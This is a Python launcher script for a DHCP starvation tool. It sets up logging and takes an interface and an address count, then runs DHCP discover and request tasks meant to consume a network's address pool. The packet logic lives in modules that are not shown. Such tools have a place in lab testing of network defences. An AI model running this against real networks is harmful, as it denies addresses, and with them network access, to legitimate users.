import os
import sys
import argparse
import logging.config
from ControllerTasks.Controller import Controller
from ControllerTasks.Tasks.Task import Task
from ControllerTasks.Tasks.TasksToDo.DHCPRequest import DHCPRequest
from ControllerTasks.Tasks.TasksToDo.DHCPdiscover import DHCPdiscover
from managers.Arguments import Arguments

class dhcpAttack():

    rootPath = None

    def __init__(self):

        self.rootPath = os.path.abspath(os.path.dirname(__file__))

        # init logging system
        self.initLog()

        # parse arguments
        self.args = self.arguments()

        # init arguments
        self.initArguments(self.args)

        #init program
        self.runClient()

    def runClient(self):

        # create controller Tasks
        self.controller = Controller()

        # running dhcp sniffer and request task
        receiveDHCPoffer = DHCPRequest(taskName='receiveDHCPoffer')
        self.controller.runTask(receiveDHCPoffer)

        # running dhcp discover task
        sentDHCPDiscover = DHCPdiscover(taskName='sentDHCPDiscover')
        self.controller.runTask(sentDHCPDiscover)

    # Method to init logs
    def initLog(self):

        application = os.path.join(self.rootPath, 'log', 'logs.log')
        dictionary = dict()
        dictionary['application'] = repr(application)
        logging.config.fileConfig(os.path.join(self.rootPath, 'configuration', 'logconf.conf'), defaults=dictionary)

    # Method to parse arguments
    def arguments(self):

        p = argparse.ArgumentParser(description=''' All your IPs are belong to us.''', formatter_class=argparse.RawTextHelpFormatter)
        p.add_argument('-i', '--interface', action='store',default='eth0',help='network interface to use')
        p.add_argument('-c', '--count', action='store',default=200, type=int,help='number of address to consume')
        args = p.parse_args()
        return args

    def initArguments(self, arguments):
        Arguments.config(arguments)

client = dhcpAttack()
